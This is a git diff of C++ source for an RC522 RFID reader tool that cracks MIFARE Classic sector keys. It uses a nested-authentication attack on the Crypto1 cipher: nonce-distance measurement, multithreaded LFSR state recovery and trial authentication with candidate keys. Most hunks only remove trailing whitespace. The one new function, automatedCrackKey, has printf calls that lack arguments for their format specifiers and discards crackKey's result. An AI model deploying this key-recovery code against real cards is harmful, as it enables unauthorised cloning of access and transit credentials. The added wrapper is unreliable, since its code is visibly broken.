@@ -52,12 +52,18 @@ Section:                                          ~key recovery
 /*=============================================================================================================
 
 NAME:                                             ~crackKey
-ARGUMENT(S): auth cmd, exploit addr (block with known key), attack addr (key to recover), opt key for exploit bloc 
+ARGUMENT(S): auth cmd, exploit addr (block with known key), attack addr (key to recover), opt key for exploit bloc
 DESCRIPTION: cracks a sector key
 RETURN:
 
 ==============================================================================================================*/
-
+bool MFrec::automatedCrackKey( byte command, byte blockAddr_e, byte blockAddr_a, byte *key /*= nullptr*/ )
+{
+    printf("B: %d, K: %d\n", blockAddr_a);
+    printf("B: %x, K: %x\n", blockAddr_a);
+    crackKey( command,  blockAddr_e, blockAddr_a, key);
+    return false;
+}// automatedCrackKey
 
 bool MFrec::crackKey( byte command, byte blockAddr_e, byte blockAddr_a, byte *key /*= nullptr*/ )
 {
@@ -92,12 +98,12 @@ bool MFrec::crackKey( byte command, byte blockAddr_e, byte blockAddr_a, byte *ke
     resetPICC( delayTime );
     initCom();
 
-    
+
     /*-------------------------------------- RECOVERY LOOP  ---------------------------------------*/
     for( int probe = 0; probe < PROBE_NR; probe++ )
     {
 	clock_gettime( CLOCK_MONOTONIC, &start );
-    
+
 	/*-------------------------------------- get nonce distance  ---------------------------------------*/
 	if( !authenticateManually( command, blockAddr_e, &n_T, key ) )
 	{
@@ -113,13 +119,13 @@ bool MFrec::crackKey( byte command, byte blockAddr_e, byte blockAddr_a, byte *ke
 
 	resetPICC( delayTime );
 
-    
+
 	/*-------------------------------------- find possible keys  ---------------------------------------*/
 
 	t_cmd = command;// stupid way to pass arguments to threads
 	t_blockAddr = blockAddr_a;
 	id_index = 0;// reset thread counter
-	
+
 	for( int sets = 0; sets<SETS_NR; sets++ )
 	{
 	    pthread_create( &t_id[sets], NULL, t_recoverKey_wrapper, this );
@@ -130,7 +136,7 @@ bool MFrec::crackKey( byte command, byte blockAddr_e, byte blockAddr_a, byte *ke
 
 	for( int sets = 0; sets<SETS_NR; sets++ ) pthread_join( t_id[sets], NULL );
 
-       
+
 
 	/*-------------------------------------- sort and find duplicates  ---------------------------------------*/
 	/*
@@ -142,7 +148,7 @@ bool MFrec::crackKey( byte command, byte blockAddr_e, byte blockAddr_a, byte *ke
 	{
 	    allKeys.insert( allKeys.end(), possibleKeys[sets].begin(), possibleKeys[sets].end() );
 	}
-	
+
 	std::sort( allKeys.begin(), allKeys.end() );
 
 	int size = allKeys.size()-1;
@@ -168,7 +174,7 @@ bool MFrec::crackKey( byte command, byte blockAddr_e, byte blockAddr_a, byte *ke
 		}
 	    counter = 0;
 	}
-	
+
 
 
 	// time the recovery process
@@ -178,13 +184,13 @@ bool MFrec::crackKey( byte command, byte blockAddr_e, byte blockAddr_a, byte *ke
 	totalElapsed += elapsed;
 
 
-        
+
 	std::cout << "<" << elapsed << ">" << "Round " << probe+1 << ": Found " << allKeys.size()
 		  << " possible keys, with most repeated key: " << maxCount << std::endl;
 
 
 	/*-------------------------------------- try likely keys  ---------------------------------------*/
-	   
+
 	for( int d = 9; d>=0; d-- )
 	{
 	    uint64_t pk = duplicateKeys[d];
@@ -192,7 +198,7 @@ bool MFrec::crackKey( byte command, byte blockAddr_e, byte blockAddr_a, byte *ke
 	    duplicateKeys[d] = 0;
 
 	    if( pk==0 ) continue;
-	
+
 	    for( int i = 0; i<6; i++ )
 	    {
 		plausibleKey[i] = (byte)pk;
@@ -205,8 +211,8 @@ bool MFrec::crackKey( byte command, byte blockAddr_e, byte blockAddr_a, byte *ke
 
 	    parityOn();
 	    initCom();
-	
-	
+
+
 	    if( authenticateManually( command, blockAddr_a, &n_T, plausibleKey ) )
 	    {
 		std::cout << "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n"
@@ -226,12 +232,12 @@ bool MFrec::crackKey( byte command, byte blockAddr_e, byte blockAddr_a, byte *ke
 		    possibleKeys[sets].clear();
 		}
 
-		
+
 		resetPICC( delayTime );
 		parityOn();
 		return true;
 	    }
-	    
+
 	    #if RC522_WIRE
 	    delay(delayTime);
 	    #endif
@@ -297,9 +303,9 @@ bool MFrec::authenticateManually( byte command, byte blockAddr, uint32_t *n_T, b
     {
 	m_auth->authParityBits[i] = oddparity( m_auth->authCommand[i] );
     }
-    
+
     byte validBits = makeRawFrame( m_auth->authCommand, 4, m_auth->authParityBits, packet );
-    
+
 #if RC522_DBG
     std::cout << "Requesting n_T\n";
 #endif
@@ -310,8 +316,8 @@ bool MFrec::authenticateManually( byte command, byte blockAddr, uint32_t *n_T, b
 	return false;
     }
 
-    extractData( packet, 5, parityBits, data ); 
-    
+    extractData( packet, 5, parityBits, data );
+
     // get back 32 bit TAG nonce
     *n_T = bytesToInt( data, 4 );
 
@@ -332,13 +338,13 @@ bool MFrec::authenticateManually( byte command, byte blockAddr, uint32_t *n_T, b
     sectorKey = ((sectorKey << 16) & 0xFFFF0000FFFF0000ULL ) | ((sectorKey >> 16) & 0x0000FFFF0000FFFFULL );
     sectorKey = (sectorKey << 32) | (sectorKey >> 32);
 	sectorKey = sectorKey >>= 16;
-	
+
     m_authInfo->key = sectorKey;
-    
+
 #if RC522_DBG
     std::cout << "Using key: "<< std::hex << sectorKey << std::dec << std::endl;
 #endif
-	
+
     keystream = crypto1_create( sectorKey );
 
     // append uid ^n_T (32 bits) to keystream
@@ -381,7 +387,7 @@ bool MFrec::authenticateManually( byte command, byte blockAddr, uint32_t *n_T, b
     // make packet
 
     validBits = makeRawFrame( data, 8, parityBits, packet );
-    
+
 
     if( !piccIO( TRANSCEIVE, 9, packet, 9, validBits ) )
     {
@@ -390,7 +396,7 @@ bool MFrec::authenticateManually( byte command, byte blockAddr, uint32_t *n_T, b
     }
 
     extractData( packet, 5, parityBits, data );
-    
+
     // should have received a_T (4 bytes)
     uint32_t a_T = bytesToInt( data, 4 );// encrypted
 
@@ -414,7 +420,7 @@ bool MFrec::authenticateManually( byte command, byte blockAddr, uint32_t *n_T, b
     knownBlock = blockAddr;
 
     return true;
-       
+
 }// authentiateManually
 
 
@@ -518,12 +524,12 @@ byte MFrec::makeRawFrame( byte *data, byte dataLen, byte *parityBits, byte *pack
 	std::cout << " ";
     }
     std::cout << std::dec << std::endl;
-    
+
     #endif
 
 
     return dataLen%8;
-    
+
 }// makeRawFrame
 
 /*=============================================================================================================
@@ -538,7 +544,7 @@ RETURN:
 void MFrec::extractData( byte *packet, byte len, byte *parityBits, byte *data )
 {
     data[0] = packet[0];
-    
+
     int i;
     for( i = 1; i<len-1; i++)
     {
@@ -550,7 +556,7 @@ void MFrec::extractData( byte *packet, byte len, byte *parityBits, byte *data )
 #if RC522_DBG
     std::cout << "Packet: ";
     for( int i = 0; i<len; i++ )
-    {	
+    {
 	for(int j=7; j>=0; j-- )
 	{
 	    std::cout << (int)( packet[i]>>j & 1 );
@@ -559,7 +565,7 @@ void MFrec::extractData( byte *packet, byte len, byte *parityBits, byte *data )
     }
     std::cout << "\nExtracted data: ";
     for( int i = 0; i<len-1; i++ )
-    {	
+    {
 	for(int j=7; j>=0; j-- )
 	{
 	    std::cout << (int)( data[i]>>j & 1 );
@@ -597,7 +603,7 @@ uint32_t MFrec::nonceDistance( uint32_t *n_T )
 #if RC522_DBG
     std::cout << "nonceDistance\n";
 #endif
-    
+
     byte packet[9];
     byte data[8];
     byte parityBits[8];
@@ -631,7 +637,7 @@ uint32_t MFrec::nonceDistance( uint32_t *n_T )
 	// extract the encrypted nonce
 	extractData( packet, 5, parityBits, data );
 	encNonce = bytesToInt( data, 4 );
-    
+
 	// reset keystream
 	keystream = crypto1_create( m_authInfo->key );
 
@@ -657,7 +663,7 @@ uint32_t MFrec::nonceDistance( uint32_t *n_T )
 	    parityBits[j] = filter( keystream ->odd ) ^ oddparity( *n_T );
 	}
 
-	validBits = makeRawFrame( data, 8, parityBits, packet ); 
+	validBits = makeRawFrame( data, 8, parityBits, packet );
 
 #if RC522_DBG
 	std::cout << "Sending READER nonce and reader answer\n";
@@ -673,7 +679,7 @@ uint32_t MFrec::nonceDistance( uint32_t *n_T )
 	*n_T = prng_successor( *n_T, 32 );
 
 	// check TAG answer
-	extractData( packet, 5, parityBits, data ); 
+	extractData( packet, 5, parityBits, data );
 	a_T = bytesToInt( data, 4 );
 	if( (crypto1_word( keystream, 0x00, 0 ) ^ a_T ) != (*n_T & 0xFFFFFFFF) )
 	{
@@ -694,9 +700,9 @@ uint32_t MFrec::nonceDistance( uint32_t *n_T )
 #if RC522_DBG
     std::cout << "Found median distance: " << medianNonceDist << std::endl;
 #endif
-    
+
     return medianNonceDist;
-    
+
 }// nonceDistance
 
 
@@ -750,10 +756,10 @@ RETURN: 1 if valid, 0 if not
 byte MFrec::isNonce( uint32_t Nt, uint32_t NtEnc, uint32_t Ks1 , byte *parity)
 {
     /*
-     * the parities of the first 3 nonce bytes are encrypted with ks1' bit 8, 16, 24, these must be equal 
-     * to the ones we extracted from the encrypted session. 
+     * the parities of the first 3 nonce bytes are encrypted with ks1' bit 8, 16, 24, these must be equal
+     * to the ones we extracted from the encrypted session.
      */
-   
+
     return ((oddparity((Nt >> 24) & 0xFF) == ((parity[0]) ^ oddparity((NtEnc >> 24) & 0xFF) ^ BIT(Ks1, 16))) & \
           (oddparity((Nt >> 16) & 0xFF) == ((parity[1]) ^ oddparity((NtEnc >> 16) & 0xFF) ^ BIT(Ks1, 8))) & \
 	    (oddparity((Nt >> 8) & 0xFF) == ((parity[2]) ^ oddparity((NtEnc >> 8) & 0xFF) ^ BIT(Ks1, 0)))) ? 1 : 0;
@@ -801,13 +807,13 @@ void MFrec::t_recoverKey( )
 
     parityOn();
     initCom();
-    
+
     if( !authenticateManually( t_cmd, knownBlock, &n_T ) )// initial authentication
     {
 	pthread_mutex_unlock(&m_lock);
 	return;
     }
-    
+
     // make encrypted nonce request after authentication
     unencData[0] = t_cmd;
     unencData[1] = t_blockAddr;
@@ -877,7 +883,7 @@ void MFrec::t_recoverKey( )
 	{
 	    // recover first 32 bits of key
 	    revstate = lfsr_recovery32( ks1, guessN_T ^ uid );
-	    
+
 	    if( revstateStart == nullptr ) revstateStart = revstate;
 
 	    while( (revstate->odd != 0x0) || (revstate->even != 0x0) )// 6 bytes
@@ -890,9 +896,9 @@ void MFrec::t_recoverKey( )
 	    }
 	    free( revstateStart );
 	}// isNonce
-	
+
 	guessN_T = prng_successor( guessN_T, 2 );// new guess
-		    
+
     }// recovery area loop
 
 
